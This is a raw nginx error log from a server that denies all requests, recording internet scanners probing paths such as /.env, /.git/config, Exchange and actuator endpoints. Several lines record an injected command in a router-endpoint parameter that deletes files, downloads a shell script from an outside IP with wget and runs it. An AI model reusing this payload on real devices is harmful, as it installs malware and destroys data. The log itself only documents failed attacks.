2024/04/22 05:43:40 [notice] 648300#0: signal process started
2024/04/22 05:43:40 [error] 648300#0: open() "/root/nginx-1.16.1/logs/nginx.pid" failed (2: No such file or directory)
2024/04/22 05:45:06 [notice] 649043#0: signal process started
2024/04/29 10:23:35 [error] 671052#0: *2673 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.125.252, server: , request: "GET /?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:36:56 [error] 671052#0: *2674 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/29 10:36:56 [error] 671052#0: *2674 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/29 11:21:46 [error] 671052#0: *2680 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 164.52.0.93, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 11:21:49 [error] 671052#0: *2680 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 164.52.0.93, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 11:21:52 [error] 671052#0: *2680 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 164.52.0.93, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 11:21:56 [error] 671052#0: *2680 open() "/root/nginx-1.16.1/html/favicon.ico" failed (13: Permission denied), client: 164.52.0.93, server: , request: "GET /favicon.ico HTTP/1.1", host: "20.2.240.132"
2024/04/29 11:21:59 [error] 671052#0: *2680 open() "/root/nginx-1.16.1/html/favicon.ico" failed (13: Permission denied), client: 164.52.0.93, server: , request: "GET /favicon.ico HTTP/1.1", host: "20.2.240.132"
2024/04/29 11:25:32 [error] 671052#0: *2693 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 115.231.78.7, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 11:25:33 [error] 671052#0: *2696 open() "/root/nginx-1.16.1/html/robots.txt" failed (13: Permission denied), client: 115.231.78.7, server: , request: "GET /robots.txt HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 12:28:21 [error] 671052#0: *2707 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 101.251.238.112, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 12:28:24 [error] 671052#0: *2707 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 101.251.238.112, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 12:28:27 [error] 671052#0: *2707 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 101.251.238.112, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 12:28:30 [error] 671052#0: *2707 open() "/root/nginx-1.16.1/html/favicon.ico" failed (13: Permission denied), client: 101.251.238.112, server: , request: "GET /favicon.ico HTTP/1.1", host: "20.2.240.132"
2024/04/29 12:28:33 [error] 671052#0: *2707 open() "/root/nginx-1.16.1/html/favicon.ico" failed (13: Permission denied), client: 101.251.238.112, server: , request: "GET /favicon.ico HTTP/1.1", host: "20.2.240.132"
2024/04/29 12:57:53 [error] 671052#0: *2720 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/29 12:57:53 [error] 671052#0: *2720 open() "/root/nginx-1.16.1/html/cgi-bin/luci/;stok=/locale" failed (13: Permission denied), client: 80.94.92.60, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.79.129%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "20.2.240.132"
2024/04/29 12:58:54 [error] 671052#0: *2721 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 192.241.233.21, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 13:02:10 [error] 671052#0: *2722 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 143.244.161.100, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 13:22:44 [error] 671052#0: *2736 open() "/root/nginx-1.16.1/html/.env" failed (13: Permission denied), client: 89.190.156.228, server: , request: "GET /.env HTTP/1.1", host: "20.2.240.132"
2024/04/29 13:22:45 [error] 671052#0: *2737 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 89.190.156.228, server: , request: "POST / HTTP/1.1", host: "20.2.240.132"
2024/04/29 13:24:53 [error] 671052#0: *2738 open() "/root/nginx-1.16.1/html/actuator/health" failed (13: Permission denied), client: 107.170.243.8, server: , request: "GET /actuator/health HTTP/1.1", host: "20.2.240.132"
2024/04/29 13:44:05 [error] 671052#0: *2740 open() "/root/nginx-1.16.1/html/EghH" failed (13: Permission denied), client: 45.56.108.128, server: , request: "GET /EghH HTTP/1.1", host: "20.2.240.132"
2024/04/29 16:47:36 [error] 671052#0: *2767 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 45.156.128.37, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 17:48:43 [error] 671052#0: *2773 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 115.231.78.3, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 17:48:44 [error] 671052#0: *2776 open() "/root/nginx-1.16.1/html/robots.txt" failed (13: Permission denied), client: 115.231.78.3, server: , request: "GET /robots.txt HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 17:52:40 [error] 671052#0: *2787 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 173.212.234.139, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 18:35:37 [error] 671052#0: *2790 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 71.6.232.22, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/29 23:34:27 [error] 671052#0: *2802 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 198.235.24.19, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/29 23:41:31 [error] 671052#0: *2803 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 162.216.149.123, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/30 00:24:23 [error] 671052#0: *2805 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 167.94.138.50, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/30 00:24:31 [error] 671052#0: *2806 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 167.94.138.50, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 01:00:07 [error] 671052#0: *2814 open() "/root/nginx-1.16.1/html/.env" failed (13: Permission denied), client: 78.153.140.177, server: , request: "GET /.env HTTP/1.1", host: "20.2.240.132"
2024/04/30 01:06:45 [error] 671052#0: *2815 open() "/root/nginx-1.16.1/html/login" failed (13: Permission denied), client: 159.203.224.42, server: , request: "GET /login HTTP/1.1", host: "20.2.240.132"
2024/04/30 01:14:10 [error] 671052#0: *2817 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 13.65.81.122, server: , request: "GET / HTTP/1.0"
2024/04/30 01:49:18 [error] 671052#0: *2822 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 13.84.165.77, server: , request: "GET / HTTP/1.0"
2024/04/30 01:53:08 [error] 671052#0: *2823 open() "/root/nginx-1.16.1/html/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application" failed (13: Permission denied), client: 13.84.165.77, server: , request: "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1", host: "20.2.240.132"
2024/04/30 01:53:08 [error] 671052#0: *2824 open() "/root/nginx-1.16.1/html/wsman" failed (13: Permission denied), client: 13.84.165.77, server: , request: "GET /wsman HTTP/1.1", host: "20.2.240.132"
2024/04/30 01:53:20 [error] 671052#0: *2843 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 13.84.165.77, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 01:53:44 [error] 671052#0: *2845 open() "/root/nginx-1.16.1/html/owa/auth/x.js" failed (13: Permission denied), client: 13.84.165.77, server: , request: "GET /owa/auth/x.js HTTP/1.1", host: "20.2.240.132"
2024/04/30 02:08:58 [error] 671052#0: *2849 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 74.82.47.3, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 02:09:06 [error] 671052#0: *2848 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 167.94.146.60, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/30 02:09:13 [error] 671052#0: *2850 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 167.94.146.60, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 02:15:19 [error] 671052#0: *2858 "/root/nginx-1.16.1/html/webui/index.html" is forbidden (13: Permission denied), client: 74.82.47.3, server: , request: "GET /webui/ HTTP/1.1", host: "20.2.240.132"
2024/04/30 02:21:18 [error] 671052#0: *2869 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 74.82.47.3, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 02:25:52 [error] 671052#0: *2870 "/root/nginx-1.16.1/html/geoserver/web/index.html" is forbidden (13: Permission denied), client: 74.82.47.3, server: , request: "GET /geoserver/web/ HTTP/1.1", host: "20.2.240.132"
2024/04/30 02:27:34 [error] 671052#0: *2871 open() "/root/nginx-1.16.1/html/.git/config" failed (13: Permission denied), client: 74.82.47.3, server: , request: "GET /.git/config HTTP/1.1", host: "20.2.240.132"
2024/04/30 03:35:57 [error] 671052#0: *2876 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 83.97.73.245, server: , request: "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1", host: "20.2.240.132:443"
2024/04/30 03:42:41 [error] 671052#0: *2877 open() "/root/nginx-1.16.1/html/owa/auth/x.js" failed (13: Permission denied), client: 162.243.128.11, server: , request: "GET /owa/auth/x.js HTTP/1.1", host: "20.2.240.132"
2024/04/30 04:46:55 [error] 671052#0: *2878 open() "/root/nginx-1.16.1/html/.env" failed (13: Permission denied), client: 159.89.177.70, server: , request: "GET /.env HTTP/1.1", host: "20.2.240.132"
2024/04/30 05:06:49 [error] 671052#0: *2880 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 157.245.92.19, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 05:33:04 [error] 671052#0: *2882 open() "/root/nginx-1.16.1/html/actuator/gateway/routes" failed (13: Permission denied), client: 83.97.73.245, server: , request: "GET /actuator/gateway/routes HTTP/1.1", host: "20.2.240.132:443"
2024/04/30 06:22:22 [error] 671052#0: *2885 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 87.67.112.11, server: , request: "GET / HTTP/1.0", host: "20.2.240.132"
2024/04/30 07:36:55 [error] 671052#0: *2896 open() "/root/nginx-1.16.1/html/autodiscover/autodiscover.json" failed (13: Permission denied), client: 198.199.97.24, server: , request: "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1", host: "20.2.240.132"
2024/04/30 08:37:42 [error] 671052#0: *2908 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 123.160.221.135, server: , request: "GET / HTTP/1.1", host: "20.2.240.132:443"
2024/04/30 08:49:29 [error] 671052#0: *2911 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 87.98.241.210, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:46 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:47 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "POST /dns-query HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:47 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /dns-query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:49 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /dns-query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:49 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "POST /dns-query HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:50 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/dns-query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /dns-query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:51 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:52 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "POST /query HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:53 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:54 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /query?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:55 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "POST /query HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:56 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/query" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /query?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:58 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /resolve?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:58 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.57.144, server: , request: "POST /resolve HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:31:59 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /resolve?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:32:00 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /resolve?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:32:02 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.57.144, server: , request: "POST /resolve HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:32:02 [error] 671052#0: *2913 open() "/root/nginx-1.16.1/html/resolve" failed (13: Permission denied), client: 47.91.57.144, server: , request: "GET /resolve?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:32:03 [error] 671052#0: *2913 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.57.144, server: , request: "GET /?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:32:04 [error] 671052#0: *2913 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.57.144, server: , request: "POST / HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:32:05 [error] 671052#0: *2913 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.57.144, server: , request: "GET /?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:32:06 [error] 671052#0: *2913 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.57.144, server: , request: "GET /?dns=q80BAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:32:07 [error] 671052#0: *2913 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.57.144, server: , request: "POST / HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:32:08 [error] 671052#0: *2913 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 47.91.57.144, server: , request: "GET /?name=example.com&type=A HTTP/1.1", host: "20.2.240.132"
2024/04/30 09:59:36 [error] 671052#0: *2916 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 87.98.241.210, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 11:09:07 [error] 671052#0: *2921 open() "/root/nginx-1.16.1/html/admin/config.php" failed (13: Permission denied), client: 87.98.241.210, server: , request: "GET //admin/config.php HTTP/1.1", host: "20.2.240.132"
2024/04/30 12:00:49 [error] 671052#0: *2925 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 45.115.225.159, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 12:06:35 [error] 671052#0: *2926 "/root/nginx-1.16.1/html/index.html" is forbidden (13: Permission denied), client: 185.180.143.71, server: , request: "GET / HTTP/1.1", host: "20.2.240.132"
2024/04/30 12:06:50 [error] 671052#0: *2927 open() "/root/nginx-1.16.1/html/cf_scripts/scripts/ajax/ckeditor/ckeditor.js" failed (13: Permission denied), client: 185.180.143.71, server: , request: "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1", host: "20.2.240.132"
